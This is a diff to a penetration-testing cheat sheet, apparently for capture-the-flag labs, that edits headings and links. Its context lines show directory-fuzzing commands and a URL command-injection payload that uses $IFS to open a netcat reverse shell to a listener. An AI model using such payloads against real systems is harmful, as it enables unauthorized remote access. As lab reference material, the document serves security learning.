@@ -80,7 +80,7 @@ scp user@10.10.10.77:/home/user/file.txt /home/kali/
 scp -r /home/kali/file.txt user@10.10.10.77:/home/user/
 ```
 
-## Reverse shells
+## Reverse shells [:octocat:](http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet)
 
 * #### With bash
 
@@ -142,7 +142,7 @@ gobuster dir -e -u http://academy.htb/ -w /usr/share/seclists/Discovery/Web-Cont
 ffuf -w /usr/share/seclists/Discovery/Web-Content/common.txt -u http://academy.htb/FUZZ -e php,txt,htm,html,phtml,js,zip,rar,tar -mc 200,302
 ```
 
-VHOST Discovery
+### VHOST Discovery
 
 * #### FuFF
 
@@ -164,7 +164,7 @@ Reverse shell
 http://10.10.10.10/$(nc.traditional$IFS-e$IFS/bin/bash$IFS'10.10.10.10'$IFS'4444')
 ```
 
-### SSTI [:octocat:](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection#jinja2)
+### SSTI [:octocat:](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection)
 
 ![](https://gblobscdn.gitbook.com/assets%2F-L_2uGJGU7AVNRcqRvEi%2F-M7O4Hp6bOFFkge_yq4G%2F-M7OCvxwZCiaP8Whx2fi%2Fimage.png?alt=media&token=4b40cf58-5561-4925-bc86-1d4689ca53d1)
 
